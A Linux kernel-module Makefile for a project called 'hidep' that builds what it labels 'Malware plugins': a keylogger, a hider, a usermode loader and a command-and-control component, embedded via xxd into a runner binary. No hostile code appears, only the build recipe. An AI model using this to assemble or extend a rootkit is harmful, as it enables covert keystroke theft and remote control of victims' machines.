# Module name
PROGRAM			:= hidep

# Build
MODULEDIR 		:= /lib/modules/$(shell uname -r)
BUILDDIR		:= $(MODULEDIR)/build
KERNELDIR		:= $(MODULEDIR)/kernel

# Src files
SRCS_S 			:= src
PLUGINS_S		:= src/plugins
LIBS_S			:= src/libs
	
# Hdr files
SRCS_H 			:= $(PWD)/$(SRCS_S)/headers
PLUGINS_H		:= $(PWD)/$(PLUGINS_S)/headers
LIBS_H			:= $(PWD)/$(LIBS_S)/headers


# Module
obj-m			:= $(PROGRAM).o

# Main
$(PROGRAM)-y	+= src/engine.o

# Malware plugins
$(PROGRAM)-y	+= src/libs/kernel_io.o

$(PROGRAM)-y	+= src/plugins/keylogger.o
$(PROGRAM)-y	+= src/plugins/hidder.o
$(PROGRAM)-y	+= src/plugins/usermode.o
$(PROGRAM)-y	+= src/plugins/cnc.o


ccflags-y 		:= -I$(SRCS_H) -I$(LIBS_H) -I$(PLUGINS_H) #-DROOTKIT_DEBUG

all:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) modules
	xxd -i $(PROGRAM).ko > $(PROGRAM)_ko.h
	gcc -B $(PWD) usermode_runner.c -o runner

clean:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) clean
	rm -f runner
	rm -f $(PROGRAM)_ko.h
